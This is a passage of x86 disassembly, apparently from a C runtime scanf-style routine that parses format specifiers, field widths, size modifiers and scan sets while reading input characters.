  40194c:	call   0x4031ab
  401951:	pop    ecx
  401952:	ret    
  401953:	push   0x1c8
  401958:	push   0x425120
  40195d:	call   0x4030a4
  401962:	mov    eax,ds:0x4272a8
  401967:	xor    eax,DWORD PTR [ebp+0x4]
  40196a:	mov    DWORD PTR [ebp-0x1c],eax
  40196d:	xor    eax,eax
  40196f:	mov    DWORD PTR [ebp-0x20],eax
  401972:	mov    DWORD PTR [ebp-0x24],eax
  401975:	mov    DWORD PTR [ebp-0x28],eax
  401978:	and    BYTE PTR [ebp-0x29],al
  40197b:	mov    DWORD PTR [ebp-0x30],eax
  40197e:	mov    DWORD PTR [ebp-0x34],eax
  401981:	mov    esi,DWORD PTR [ebp+0xc]
  401984:	mov    al,BYTE PTR [esi]
  401986:	test   al,al
  401988:	je     0x4024b2
  40198e:	movzx  eax,al
  401991:	cmp    DWORD PTR ds:0x427278,0x1
  401998:	jle    0x4019a6
  40199a:	push   0x8
  40199c:	push   eax
  40199d:	call   0x40312d
  4019a2:	pop    ecx
  4019a3:	pop    ecx
  4019a4:	jmp    0x4019b3
  4019a6:	mov    ecx,DWORD PTR ds:0x427270
  4019ac:	movzx  eax,BYTE PTR [ecx+eax*2]
  4019b0:	and    eax,0x8
  4019b3:	xor    edi,edi
  4019b5:	cmp    eax,edi
  4019b7:	je     0x4019fa
  4019b9:	dec    DWORD PTR [ebp-0x30]
  4019bc:	inc    DWORD PTR [ebp-0x30]
  4019bf:	mov    edx,DWORD PTR [ebp+0x8]
  4019c2:	call   0x40193d
  4019c7:	mov    esi,eax
  4019c9:	push   esi
  4019ca:	call   0x4032f5
  4019cf:	pop    ecx
  4019d0:	test   eax,eax
  4019d2:	jne    0x4019bc
  4019d4:	cmp    esi,0xffffffff
  4019d7:	je     0x4019e4
  4019d9:	push   DWORD PTR [ebp+0x8]
  4019dc:	push   esi
  4019dd:	call   0x403289
  4019e2:	pop    ecx
  4019e3:	pop    ecx
  4019e4:	inc    DWORD PTR [ebp+0xc]
  4019e7:	mov    eax,DWORD PTR [ebp+0xc]
  4019ea:	movzx  eax,BYTE PTR [eax]
  4019ed:	push   eax
  4019ee:	call   0x4032f5
  4019f3:	pop    ecx
  4019f4:	test   eax,eax
  4019f6:	jne    0x4019e4
  4019f8:	jmp    0x401981
  4019fa:	mov    esi,DWORD PTR [ebp+0xc]
  4019fd:	cmp    BYTE PTR [esi],0x25
  401a00:	jne    0x40242e
  401a06:	mov    DWORD PTR [ebp-0x38],edi
  401a09:	and    BYTE PTR [ebp-0x39],0x0
  401a0d:	mov    DWORD PTR [ebp-0x40],edi
  401a10:	mov    DWORD PTR [ebp-0x44],edi
  401a13:	mov    DWORD PTR [ebp-0x48],edi
  401a16:	and    BYTE PTR [ebp-0x49],0x0
  401a1a:	and    BYTE PTR [ebp-0x4a],0x0
  401a1e:	and    BYTE PTR [ebp-0x4b],0x0
  401a22:	and    BYTE PTR [ebp-0x4c],0x0
  401a26:	and    BYTE PTR [ebp-0x4d],0x0
  401a2a:	and    BYTE PTR [ebp-0x4e],0x0
  401a2e:	mov    BYTE PTR [ebp-0x4f],0x1
  401a32:	mov    DWORD PTR [ebp-0x54],edi
  401a35:	inc    esi
  401a36:	movzx  ebx,BYTE PTR [esi]
  401a39:	movzx  eax,bl
  401a3c:	cmp    DWORD PTR ds:0x427278,0x1
  401a43:	jle    0x401a51
  401a45:	push   0x4
  401a47:	push   eax
  401a48:	call   0x40312d
  401a4d:	pop    ecx
  401a4e:	pop    ecx
  401a4f:	jmp    0x401a5e
  401a51:	mov    ecx,DWORD PTR ds:0x427270
  401a57:	movzx  eax,BYTE PTR [ecx+eax*2]
  401a5b:	and    eax,0x4
  401a5e:	test   eax,eax
  401a60:	je     0x401a71
  401a62:	inc    DWORD PTR [ebp-0x44]
  401a65:	lea    eax,[edi+edi*4]
  401a68:	lea    edi,[ebx+eax*2-0x30]
  401a6c:	jmp    0x401b0b
  401a71:	cmp    ebx,0x4e
  401a74:	jg     0x401ae9
  401a76:	je     0x401b0b
  401a7c:	cmp    ebx,0x2a
  401a7f:	je     0x401ae4
  401a81:	cmp    ebx,0x46
  401a84:	je     0x401b0b
  401a8a:	cmp    ebx,0x49
  401a8d:	je     0x401a99
  401a8f:	cmp    ebx,0x4c
  401a92:	jne    0x401af8
  401a94:	inc    BYTE PTR [ebp-0x4f]
  401a97:	jmp    0x401b0b
  401a99:	mov    cl,BYTE PTR [esi+0x1]
  401a9c:	cmp    cl,0x36
  401a9f:	jne    0x401ab8
  401aa1:	lea    eax,[esi+0x2]
  401aa4:	cmp    BYTE PTR [eax],0x34
  401aa7:	jne    0x401ab8
  401aa9:	mov    esi,eax
  401aab:	inc    DWORD PTR [ebp-0x54]
  401aae:	and    DWORD PTR [ebp-0x5c],0x0
  401ab2:	and    DWORD PTR [ebp-0x58],0x0
  401ab6:	jmp    0x401b0b
  401ab8:	cmp    cl,0x33
  401abb:	jne    0x401ac9
  401abd:	lea    eax,[esi+0x2]
  401ac0:	cmp    BYTE PTR [eax],0x32
  401ac3:	jne    0x401ac9
  401ac5:	mov    esi,eax
  401ac7:	jmp    0x401b0b
  401ac9:	cmp    cl,0x64
  401acc:	je     0x401b0b
  401ace:	cmp    cl,0x69
  401ad1:	je     0x401b0b
  401ad3:	cmp    cl,0x6f
  401ad6:	je     0x401b0b
  401ad8:	cmp    cl,0x78
  401adb:	je     0x401b0b
  401add:	cmp    cl,0x58
  401ae0:	jne    0x401af8
  401ae2:	jmp    0x401b0b
  401ae4:	inc    BYTE PTR [ebp-0x4b]
  401ae7:	jmp    0x401b0b
  401ae9:	cmp    ebx,0x68
  401aec:	je     0x401b05
  401aee:	cmp    ebx,0x6c
  401af1:	je     0x401afd
  401af3:	cmp    ebx,0x77
  401af6:	je     0x401b00
  401af8:	inc    BYTE PTR [ebp-0x4c]
  401afb:	jmp    0x401b0b
  401afd:	inc    BYTE PTR [ebp-0x4f]
  401b00:	inc    BYTE PTR [ebp-0x4e]
  401b03:	jmp    0x401b0b
  401b05:	dec    BYTE PTR [ebp-0x4f]
  401b08:	dec    BYTE PTR [ebp-0x4e]
  401b0b:	cmp    BYTE PTR [ebp-0x4c],0x0
  401b0f:	je     0x401a35
  401b15:	mov    DWORD PTR [ebp-0x48],edi
  401b18:	mov    DWORD PTR [ebp+0xc],esi
  401b1b:	cmp    BYTE PTR [ebp-0x4b],0x0
  401b1f:	jne    0x401b35
  401b21:	mov    eax,DWORD PTR [ebp+0x10]
  401b24:	mov    DWORD PTR [ebp-0x60],eax
  401b27:	add    eax,0x4
  401b2a:	mov    DWORD PTR [ebp+0x10],eax
  401b2d:	mov    ebx,DWORD PTR [eax-0x4]
  401b30:	mov    DWORD PTR [ebp-0x64],ebx
  401b33:	jmp    0x401b38
  401b35:	mov    ebx,DWORD PTR [ebp-0x64]
  401b38:	and    BYTE PTR [ebp-0x4c],0x0
  401b3c:	cmp    BYTE PTR [ebp-0x4e],0x0
  401b40:	jne    0x401b56
  401b42:	mov    al,BYTE PTR [esi]
  401b44:	cmp    al,0x53
  401b46:	je     0x401b52
  401b48:	cmp    al,0x43
  401b4a:	je     0x401b52
  401b4c:	or     BYTE PTR [ebp-0x4e],0xff
  401b50:	jmp    0x401b56
  401b52:	mov    BYTE PTR [ebp-0x4e],0x1
  401b56:	movzx  edi,BYTE PTR [esi]
  401b59:	or     edi,0x20
  401b5c:	mov    DWORD PTR [ebp-0x68],edi
  401b5f:	cmp    edi,0x6e
  401b62:	je     0x401b9c
  401b64:	cmp    edi,0x63
  401b67:	je     0x401b8e
  401b69:	cmp    edi,0x7b
  401b6c:	je     0x401b8e
  401b6e:	inc    DWORD PTR [ebp-0x30]
  401b71:	mov    edx,DWORD PTR [ebp+0x8]
  401b74:	call   0x40193d
  401b79:	mov    esi,eax
  401b7b:	push   esi
  401b7c:	call   0x4032f5
  401b81:	pop    ecx
  401b82:	test   eax,eax
  401b84:	jne    0x401b6e
  401b86:	mov    DWORD PTR [ebp-0x28],esi
  401b89:	mov    esi,DWORD PTR [ebp+0xc]
  401b8c:	jmp    0x401b9c
  401b8e:	inc    DWORD PTR [ebp-0x30]
  401b91:	mov    edx,DWORD PTR [ebp+0x8]
  401b94:	call   0x40193d
  401b99:	mov    DWORD PTR [ebp-0x28],eax
  401b9c:	mov    ecx,DWORD PTR [ebp-0x44]
  401b9f:	test   ecx,ecx
  401ba1:	je     0x401bad
  401ba3:	cmp    DWORD PTR [ebp-0x48],0x0
  401ba7:	je     0x401e45
  401bad:	cmp    edi,0x6f
  401bb0:	jg     0x401e17
  401bb6:	je     0x40218c
  401bbc:	cmp    edi,0x63
  401bbf:	je     0x401df6
  401bc5:	cmp    edi,0x64
  401bc8:	je     0x40218c
  401bce:	jle    0x401e3d
  401bd4:	cmp    edi,0x67
  401bd7:	jle    0x401c11
  401bd9:	cmp    edi,0x69
  401bdc:	je     0x401bf9
  401bde:	cmp    edi,0x6e
  401be1:	jne    0x401e3d
  401be7:	mov    eax,DWORD PTR [ebp-0x30]
  401bea:	cmp    BYTE PTR [ebp-0x4b],0x0
  401bee:	je     0x402403
  401bf4:	jmp    0x402423
  401bf9:	push   0x64
  401bfb:	pop    edi
  401bfc:	mov    ebx,DWORD PTR [ebp-0x28]
  401bff:	cmp    ebx,0x2d
  401c02:	jne    0x402080
  401c08:	mov    BYTE PTR [ebp-0x4a],0x1
  401c0c:	jmp    0x402085
  401c11:	lea    esi,[ebp-0x1c8]
  401c17:	mov    ebx,DWORD PTR [ebp-0x28]
  401c1a:	cmp    ebx,0x2d
  401c1d:	jne    0x401c2d
  401c1f:	mov    BYTE PTR [ebp-0x1c8],bl
  401c25:	lea    esi,[ebp-0x1c7]
  401c2b:	jmp    0x401c32
  401c2d:	cmp    ebx,0x2b
  401c30:	jne    0x401c49
  401c32:	dec    DWORD PTR [ebp-0x48]
  401c35:	inc    DWORD PTR [ebp-0x30]
  401c38:	mov    edi,DWORD PTR [ebp+0x8]
  401c3b:	mov    edx,edi
  401c3d:	call   0x40193d
  401c42:	mov    ebx,eax
  401c44:	mov    DWORD PTR [ebp-0x28],ebx
  401c47:	jmp    0x401c4c
  401c49:	mov    edi,DWORD PTR [ebp+0x8]
  401c4c:	cmp    DWORD PTR [ebp-0x44],0x0
  401c50:	je     0x401c5b
  401c52:	cmp    DWORD PTR [ebp-0x48],0x15d
  401c59:	jle    0x401c62
  401c5b:	mov    DWORD PTR [ebp-0x48],0x15d
  401c62:	cmp    DWORD PTR ds:0x427278,0x1
  401c69:	jle    0x401c77
  401c6b:	push   0x4
  401c6d:	push   ebx
  401c6e:	call   0x40312d
  401c73:	pop    ecx
  401c74:	pop    ecx
  401c75:	jmp    0x401c83
  401c77:	mov    eax,ds:0x427270
  401c7c:	movzx  eax,BYTE PTR [eax+ebx*2]
  401c80:	and    eax,0x4
  401c83:	test   eax,eax
  401c85:	je     0x401ca8
  401c87:	mov    eax,DWORD PTR [ebp-0x48]
  401c8a:	dec    DWORD PTR [ebp-0x48]
  401c8d:	test   eax,eax
  401c8f:	je     0x401ca8
  401c91:	inc    DWORD PTR [ebp-0x40]
  401c94:	mov    BYTE PTR [esi],bl
  401c96:	inc    esi
  401c97:	inc    DWORD PTR [ebp-0x30]
  401c9a:	mov    edx,edi
  401c9c:	call   0x40193d
  401ca1:	mov    ebx,eax
  401ca3:	mov    DWORD PTR [ebp-0x28],ebx
  401ca6:	jmp    0x401c62
  401ca8:	cmp    BYTE PTR ds:0x42727c,bl
  401cae:	jne    0x401d14
  401cb0:	mov    eax,DWORD PTR [ebp-0x48]
  401cb3:	dec    DWORD PTR [ebp-0x48]
  401cb6:	test   eax,eax
  401cb8:	je     0x401d14
  401cba:	inc    DWORD PTR [ebp-0x30]
  401cbd:	mov    edx,edi
  401cbf:	call   0x40193d
  401cc4:	mov    ebx,eax
  401cc6:	mov    al,ds:0x42727c
  401ccb:	mov    BYTE PTR [esi],al
  401ccd:	inc    esi
  401cce:	mov    DWORD PTR [ebp-0x28],ebx
  401cd1:	cmp    DWORD PTR ds:0x427278,0x1
  401cd8:	jle    0x401ce6
  401cda:	push   0x4
  401cdc:	push   ebx
  401cdd:	call   0x40312d
  401ce2:	pop    ecx
  401ce3:	pop    ecx
  401ce4:	jmp    0x401cf2
  401ce6:	mov    eax,ds:0x427270
  401ceb:	movzx  eax,BYTE PTR [eax+ebx*2]
  401cef:	and    eax,0x4
  401cf2:	test   eax,eax
  401cf4:	je     0x401d14
  401cf6:	mov    eax,DWORD PTR [ebp-0x48]
  401cf9:	dec    DWORD PTR [ebp-0x48]
  401cfc:	test   eax,eax
  401cfe:	je     0x401d14
  401d00:	inc    DWORD PTR [ebp-0x40]
  401d03:	mov    BYTE PTR [esi],bl
  401d05:	inc    esi
  401d06:	inc    DWORD PTR [ebp-0x30]
  401d09:	mov    edx,edi
  401d0b:	call   0x40193d
  401d10:	mov    ebx,eax
  401d12:	jmp    0x401cce
  401d14:	cmp    DWORD PTR [ebp-0x40],0x0
  401d18:	je     0x401dad
  401d1e:	cmp    ebx,0x65
  401d21:	je     0x401d2c
  401d23:	cmp    ebx,0x45
  401d26:	jne    0x401dad
  401d2c:	mov    eax,DWORD PTR [ebp-0x48]
  401d2f:	dec    DWORD PTR [ebp-0x48]
  401d32:	test   eax,eax
  401d34:	je     0x401dad
  401d36:	mov    BYTE PTR [esi],0x65
  401d39:	inc    esi
  401d3a:	inc    DWORD PTR [ebp-0x30]
  401d3d:	mov    edx,edi
  401d3f:	call   0x40193d
  401d44:	mov    ebx,eax
  401d46:	mov    DWORD PTR [ebp-0x28],ebx
  401d49:	cmp    ebx,0x2d
  401d4c:	jne    0x401d53
  401d4e:	mov    BYTE PTR [esi],al
  401d50:	inc    esi
  401d51:	jmp    0x401d58
  401d53:	cmp    ebx,0x2b
  401d56:	jne    0x401d76
  401d58:	mov    eax,DWORD PTR [ebp-0x48]
  401d5b:	dec    DWORD PTR [ebp-0x48]
  401d5e:	test   eax,eax
  401d60:	jne    0x401d67
  401d62:	and    DWORD PTR [ebp-0x48],eax
  401d65:	jmp    0x401d76
  401d67:	mov    edx,edi
  401d69:	inc    DWORD PTR [ebp-0x30]
  401d6c:	call   0x40193d
  401d71:	mov    ebx,eax
  401d73:	mov    DWORD PTR [ebp-0x28],ebx
  401d76:	cmp    DWORD PTR ds:0x427278,0x1
  401d7d:	jle    0x401d8b
  401d7f:	push   0x4
  401d81:	push   ebx
  401d82:	call   0x40312d
  401d87:	pop    ecx
  401d88:	pop    ecx
  401d89:	jmp    0x401d97
  401d8b:	mov    eax,ds:0x427270
  401d90:	movzx  eax,BYTE PTR [eax+ebx*2]
  401d94:	and    eax,0x4
  401d97:	test   eax,eax
  401d99:	je     0x401dad
  401d9b:	mov    eax,DWORD PTR [ebp-0x48]
  401d9e:	dec    DWORD PTR [ebp-0x48]
  401da1:	test   eax,eax
  401da3:	je     0x401dad
  401da5:	inc    DWORD PTR [ebp-0x40]
  401da8:	mov    BYTE PTR [esi],bl
  401daa:	inc    esi
  401dab:	jmp    0x401d67
  401dad:	dec    DWORD PTR [ebp-0x30]
  401db0:	cmp    ebx,0xffffffff
  401db3:	je     0x401dbe
  401db5:	push   edi
  401db6:	push   ebx
  401db7:	call   0x403289
  401dbc:	pop    ecx
  401dbd:	pop    ecx
  401dbe:	cmp    DWORD PTR [ebp-0x40],0x0
  401dc2:	je     0x4024b2
  401dc8:	cmp    BYTE PTR [ebp-0x4b],0x0
  401dcc:	jne    0x402423
  401dd2:	inc    DWORD PTR [ebp-0x34]
  401dd5:	and    BYTE PTR [esi],0x0
  401dd8:	lea    eax,[ebp-0x1c8]
  401dde:	push   eax
  401ddf:	push   DWORD PTR [ebp-0x64]
  401de2:	movsx  eax,BYTE PTR [ebp-0x4f]
  401de6:	dec    eax
  401de7:	push   eax
  401de8:	call   DWORD PTR ds:0x427298
  401dee:	add    esp,0xc
  401df1:	jmp    0x402423
  401df6:	test   ecx,ecx
  401df8:	jne    0x401e04
  401dfa:	mov    DWORD PTR [ebp-0x44],0x1
  401e01:	inc    DWORD PTR [ebp-0x48]
  401e04:	cmp    BYTE PTR [ebp-0x4e],0x0
  401e08:	jle    0x401f8c
  401e0e:	mov    BYTE PTR [ebp-0x4d],0x1
  401e12:	jmp    0x401f8c
  401e17:	mov    eax,edi
  401e19:	sub    eax,0x70
  401e1c:	je     0x402188
  401e22:	sub    eax,0x3
  401e25:	je     0x401e04
  401e27:	dec    eax
  401e28:	dec    eax
  401e29:	je     0x40218c
  401e2f:	sub    eax,0x3
  401e32:	je     0x401bfc
  401e38:	sub    eax,0x3
  401e3b:	je     0x401e66
  401e3d:	movzx  eax,BYTE PTR [esi]
  401e40:	cmp    eax,DWORD PTR [ebp-0x28]
  401e43:	je     0x401e4e
  401e45:	cmp    DWORD PTR [ebp-0x28],0xffffffff
  401e49:	jmp    0x402482
  401e4e:	dec    BYTE PTR [ebp-0x29]
  401e51:	cmp    BYTE PTR [ebp-0x4b],0x0
  401e55:	jne    0x402423
  401e5b:	mov    eax,DWORD PTR [ebp-0x60]
  401e5e:	mov    DWORD PTR [ebp+0x10],eax
  401e61:	jmp    0x402423
  401e66:	cmp    BYTE PTR [ebp-0x4e],0x0
  401e6a:	jle    0x401e70
  401e6c:	mov    BYTE PTR [ebp-0x4d],0x1
  401e70:	mov    edi,DWORD PTR [ebp+0xc]
  401e73:	inc    edi
  401e74:	mov    DWORD PTR [ebp+0xc],edi
  401e77:	mov    DWORD PTR [ebp-0x1cc],edi
  401e7d:	cmp    BYTE PTR [edi],0x5e
  401e80:	jne    0x401e8d
  401e82:	inc    edi
  401e83:	mov    DWORD PTR [ebp-0x1cc],edi
  401e89:	or     BYTE PTR [ebp-0x49],0xff
  401e8d:	mov    ebx,DWORD PTR [ebp-0x20]
  401e90:	test   ebx,ebx
  401e92:	jne    0x401ee5
  401e94:	and    DWORD PTR [ebp-0x4],ebx
  401e97:	push   0x20
  401e99:	pop    eax
  401e9a:	call   0x4030f0
  401e9f:	mov    DWORD PTR [ebp-0x18],esp
  401ea2:	mov    ebx,esp
  401ea4:	mov    DWORD PTR [ebp-0x20],ebx
  401ea7:	or     DWORD PTR [ebp-0x4],0xffffffff
  401eab:	jmp    0x401ee5
  401ead:	xor    eax,eax
  401eaf:	inc    eax
  401eb0:	ret    
  401eb1:	mov    esp,DWORD PTR [ebp-0x18]
  401eb4:	call   0x403504
  401eb9:	push   0x20
  401ebb:	call   0x4034f2
  401ec0:	pop    ecx
  401ec1:	mov    DWORD PTR [ebp-0x20],eax
  401ec4:	test   eax,eax
  401ec6:	jne    0x401ed1
  401ec8:	or     DWORD PTR [ebp-0x4],0xffffffff
  401ecc:	jmp    0x4024b2
  401ed1:	mov    DWORD PTR [ebp-0x24],0x1
  401ed8:	or     DWORD PTR [ebp-0x4],0xffffffff
  401edc:	mov    edi,DWORD PTR [ebp-0x1cc]
  401ee2:	mov    ebx,DWORD PTR [ebp-0x20]
  401ee5:	push   0x20
  401ee7:	push   0x0
  401ee9:	push   ebx
  401eea:	call   0x403420
  401eef:	add    esp,0xc
  401ef2:	cmp    DWORD PTR [ebp-0x68],0x7b
  401ef6:	jne    0x401f6c
  401ef8:	cmp    BYTE PTR [edi],0x5d
  401efb:	jne    0x401f6c
  401efd:	mov    dl,0x5d
  401eff:	inc    edi
  401f00:	mov    BYTE PTR [ebx+0xb],0x20
  401f04:	jmp    0x401f6f
  401f06:	inc    edi
  401f07:	cmp    al,0x2d
  401f09:	jne    0x401f56
  401f0b:	test   dl,dl
  401f0d:	je     0x401f56
  401f0f:	mov    cl,BYTE PTR [edi]
  401f11:	cmp    cl,0x5d
  401f14:	je     0x401f56
  401f16:	inc    edi
  401f17:	cmp    dl,cl
  401f19:	jae    0x401f1f
  401f1b:	mov    al,cl
  401f1d:	jmp    0x401f23
  401f1f:	mov    al,dl
  401f21:	mov    dl,cl
  401f23:	cmp    dl,al
  401f25:	ja     0x401f52
  401f27:	movzx  esi,dl
  401f2a:	sub    al,dl
  401f2c:	inc    al
  401f2e:	movzx  eax,al
  401f31:	mov    DWORD PTR [ebp-0x1d0],eax
  401f37:	mov    eax,esi
  401f39:	shr    eax,0x3
  401f3c:	add    eax,ebx
  401f3e:	mov    ecx,esi
  401f40:	and    ecx,0x7
  401f43:	mov    dl,0x1
  401f45:	shl    dl,cl
  401f47:	or     BYTE PTR [eax],dl
  401f49:	inc    esi
  401f4a:	dec    DWORD PTR [ebp-0x1d0]
  401f50:	jne    0x401f37
  401f52:	xor    dl,dl
  401f54:	jmp    0x401f6f
  401f56:	mov    BYTE PTR [ebp-0x39],al
  401f59:	movzx  ecx,al
  401f5c:	mov    eax,ecx
  401f5e:	shr    eax,0x3
  401f61:	add    eax,ebx
  401f63:	and    ecx,0x7
  401f66:	mov    dl,0x1
  401f68:	shl    dl,cl
  401f6a:	or     BYTE PTR [eax],dl
  401f6c:	mov    dl,BYTE PTR [ebp-0x39]
  401f6f:	mov    al,BYTE PTR [edi]
  401f71:	cmp    al,0x5d
  401f73:	jne    0x401f06
  401f75:	test   al,al
  401f77:	je     0x4024b2
  401f7d:	mov    ebx,DWORD PTR [ebp-0x64]
  401f80:	cmp    DWORD PTR [ebp-0x68],0x7b
  401f84:	jne    0x401f89
  401f86:	mov    DWORD PTR [ebp+0xc],edi
  401f89:	mov    edi,DWORD PTR [ebp-0x68]
  401f8c:	mov    esi,ebx
  401f8e:	dec    DWORD PTR [ebp-0x30]
  401f91:	cmp    DWORD PTR [ebp-0x28],0xffffffff
  401f95:	je     0x401fa4
  401f97:	push   DWORD PTR [ebp+0x8]
  401f9a:	push   DWORD PTR [ebp-0x28]
  401f9d:	call   0x403289
  401fa2:	pop    ecx
  401fa3:	pop    ecx
  401fa4:	cmp    DWORD PTR [ebp-0x44],0x0
  401fa8:	je     0x401fb8
  401faa:	mov    eax,DWORD PTR [ebp-0x48]
  401fad:	dec    DWORD PTR [ebp-0x48]
  401fb0:	test   eax,eax
  401fb2:	je     0x40214f
  401fb8:	inc    DWORD PTR [ebp-0x30]
  401fbb:	mov    edx,DWORD PTR [ebp+0x8]
  401fbe:	call   0x40193d
  401fc3:	mov    DWORD PTR [ebp-0x28],eax
  401fc6:	cmp    eax,0xffffffff
  401fc9:	je     0x40213c
  401fcf:	cmp    edi,0x63
  401fd2:	je     0x402018
  401fd4:	cmp    edi,0x73
  401fd7:	jne    0x401fe8
  401fd9:	cmp    eax,0x9
  401fdc:	jl     0x401fe3
  401fde:	cmp    eax,0xd
  401fe1:	jle    0x401fe8
  401fe3:	cmp    eax,0x20
  401fe6:	jne    0x402018
  401fe8:	cmp    edi,0x7b
  401feb:	jne    0x40213c
  401ff1:	mov    ecx,eax
  401ff3:	and    ecx,0x7
  401ff6:	xor    edx,edx
  401ff8:	inc    edx
  401ff9:	shl    edx,cl
  401ffb:	mov    ecx,eax
  401ffd:	sar    ecx,0x3
  402000:	mov    edi,DWORD PTR [ebp-0x20]
  402003:	movsx  ecx,BYTE PTR [ecx+edi*1]
  402007:	movsx  edi,BYTE PTR [ebp-0x49]
  40200b:	xor    ecx,edi
  40200d:	test   ecx,edx
  40200f:	je     0x40213c
  402015:	mov    edi,DWORD PTR [ebp-0x68]
  402018:	cmp    BYTE PTR [ebp-0x4b],0x0
  40201c:	jne    0x402136
  402022:	cmp    BYTE PTR [ebp-0x4d],0x0
  402026:	je     0x40212b
  40202c:	mov    BYTE PTR [ebp-0x1d4],al
  402032:	movzx  eax,al
  402035:	mov    ecx,DWORD PTR ds:0x427270
  40203b:	test   BYTE PTR [ecx+eax*2+0x1],0x80
  402040:	je     0x402053
  402042:	inc    DWORD PTR [ebp-0x30]
  402045:	mov    edx,DWORD PTR [ebp+0x8]
  402048:	call   0x40193d
  40204d:	mov    BYTE PTR [ebp-0x1d3],al
  402053:	push   DWORD PTR ds:0x427278
  402059:	lea    eax,[ebp-0x1d4]
  40205f:	push   eax
  402060:	lea    eax,[ebp-0x1d8]
  402066:	push   eax
  402067:	call   0x403356
  40206c:	add    esp,0xc
  40206f:	mov    ax,WORD PTR [ebp-0x1d8]
  402076:	mov    WORD PTR [ebx],ax
  402079:	inc    ebx
  40207a:	inc    ebx
  40207b:	jmp    0x40212e
  402080:	cmp    ebx,0x2b
  402083:	jne    0x4020a4
  402085:	dec    DWORD PTR [ebp-0x48]
  402088:	jne    0x402094
  40208a:	test   ecx,ecx
  40208c:	je     0x402094
  40208e:	mov    BYTE PTR [ebp-0x4c],0x1
  402092:	jmp    0x4020a4
  402094:	inc    DWORD PTR [ebp-0x30]
  402097:	mov    edx,DWORD PTR [ebp+0x8]
  40209a:	call   0x40193d
  40209f:	mov    ebx,eax
  4020a1:	mov    DWORD PTR [ebp-0x28],ebx
  4020a4:	cmp    ebx,0x30
  4020a7:	jne    0x4021be
  4020ad:	inc    DWORD PTR [ebp-0x30]
  4020b0:	mov    edx,DWORD PTR [ebp+0x8]
  4020b3:	call   0x40193d
  4020b8:	mov    ebx,eax
  4020ba:	mov    DWORD PTR [ebp-0x28],ebx
  4020bd:	cmp    bl,0x78
  4020c0:	je     0x402104
  4020c2:	cmp    bl,0x58
  4020c5:	je     0x402104
  4020c7:	mov    DWORD PTR [ebp-0x40],0x1
  4020ce:	cmp    edi,0x78
  4020d1:	je     0x4020e9
  4020d3:	cmp    DWORD PTR [ebp-0x44],0x0
  4020d7:	je     0x4020e1
  4020d9:	dec    DWORD PTR [ebp-0x48]
  4020dc:	jne    0x4020e1
  4020de:	inc    BYTE PTR [ebp-0x4c]
  4020e1:	push   0x6f
  4020e3:	pop    edi
  4020e4:	jmp    0x4021be
  4020e9:	dec    DWORD PTR [ebp-0x30]
  4020ec:	cmp    ebx,0xffffffff
  4020ef:	je     0x4020fc
  4020f1:	push   DWORD PTR [ebp+0x8]
  4020f4:	push   ebx
  4020f5:	call   0x403289
  4020fa:	pop    ecx
  4020fb:	pop    ecx
  4020fc:	push   0x30
  4020fe:	pop    ebx
  4020ff:	jmp    0x4021bb
  402104:	inc    DWORD PTR [ebp-0x30]
  402107:	mov    edx,DWORD PTR [ebp+0x8]
  40210a:	call   0x40193d
  40210f:	mov    ebx,eax
  402111:	mov    DWORD PTR [ebp-0x28],ebx
  402114:	cmp    DWORD PTR [ebp-0x44],0x0
  402118:	je     0x402127
  40211a:	sub    DWORD PTR [ebp-0x48],0x2
  40211e:	cmp    DWORD PTR [ebp-0x48],0x1
  402122:	jge    0x402127
  402124:	inc    BYTE PTR [ebp-0x4c]
  402127:	push   0x78
  402129:	jmp    0x4020e3
  40212b:	mov    BYTE PTR [ebx],al
  40212d:	inc    ebx
  40212e:	mov    DWORD PTR [ebp-0x64],ebx
  402131:	jmp    0x401fa4
  402136:	inc    esi
  402137:	jmp    0x401fa4
  40213c:	dec    DWORD PTR [ebp-0x30]
  40213f:	cmp    eax,0xffffffff
  402142:	je     0x40214f
  402144:	push   DWORD PTR [ebp+0x8]
  402147:	push   eax
  402148:	call   0x403289
  40214d:	pop    ecx
  40214e:	pop    ecx
  40214f:	cmp    esi,ebx
  402151:	je     0x4024b2
  402157:	cmp    BYTE PTR [ebp-0x4b],0x0
  40215b:	jne    0x402423
  402161:	inc    DWORD PTR [ebp-0x34]
  402164:	cmp    DWORD PTR [ebp-0x68],0x63
  402168:	je     0x402423
  40216e:	mov    eax,DWORD PTR [ebp-0x64]
  402171:	cmp    BYTE PTR [ebp-0x4d],0x0
  402175:	je     0x402180
  402177:	and    WORD PTR [eax],0x0
  40217b:	jmp    0x402423
  402180:	and    BYTE PTR [eax],0x0
  402183:	jmp    0x402423
  402188:	mov    BYTE PTR [ebp-0x4f],0x1
  40218c:	mov    ebx,DWORD PTR [ebp-0x28]
  40218f:	cmp    ebx,0x2d
  402192:	jne    0x40219a
  402194:	mov    BYTE PTR [ebp-0x4a],0x1
  402198:	jmp    0x40219f
  40219a:	cmp    ebx,0x2b
  40219d:	jne    0x4021be
  40219f:	dec    DWORD PTR [ebp-0x48]
  4021a2:	jne    0x4021ae
  4021a4:	test   ecx,ecx
  4021a6:	je     0x4021ae
  4021a8:	mov    BYTE PTR [ebp-0x4c],0x1
  4021ac:	jmp    0x4021be
  4021ae:	inc    DWORD PTR [ebp-0x30]
  4021b1:	mov    edx,DWORD PTR [ebp+0x8]
  4021b4:	call   0x40193d
  4021b9:	mov    ebx,eax
  4021bb:	mov    DWORD PTR [ebp-0x28],ebx
  4021be:	cmp    DWORD PTR [ebp-0x54],0x0
  4021c2:	je     0x4022f5
  4021c8:	cmp    BYTE PTR [ebp-0x4c],0x0
  4021cc:	jne    0x4022d3
  4021d2:	mov    esi,0x80
  4021d7:	cmp    edi,0x78
  4021da:	je     0x40223c
  4021dc:	cmp    edi,0x70
  4021df:	je     0x40223c
  4021e1:	cmp    DWORD PTR ds:0x427278,0x1
  4021e8:	jle    0x4021f6
  4021ea:	push   0x4
  4021ec:	push   ebx
  4021ed:	call   0x40312d
  4021f2:	pop    ecx
  4021f3:	pop    ecx
  4021f4:	jmp    0x402202
  4021f6:	mov    eax,ds:0x427270
  4021fb:	movzx  eax,BYTE PTR [eax+ebx*2]
  4021ff:	and    eax,0x4
  402202:	test   eax,eax
  402204:	je     0x40227d
  402206:	cmp    edi,0x6f
  402209:	jne    0x402225
  40220b:	cmp    ebx,0x38
  40220e:	jge    0x40227d
  402210:	mov    eax,DWORD PTR [ebp-0x5c]
  402213:	mov    ecx,DWORD PTR [ebp-0x58]
  402216:	shld   ecx,eax,0x3
  40221a:	shl    eax,0x3
  40221d:	mov    DWORD PTR [ebp-0x5c],eax
  402220:	mov    DWORD PTR [ebp-0x58],ecx
  402223:	jmp    0x402280
  402225:	push   0x0
  402227:	push   0xa
  402229:	push   DWORD PTR [ebp-0x58]
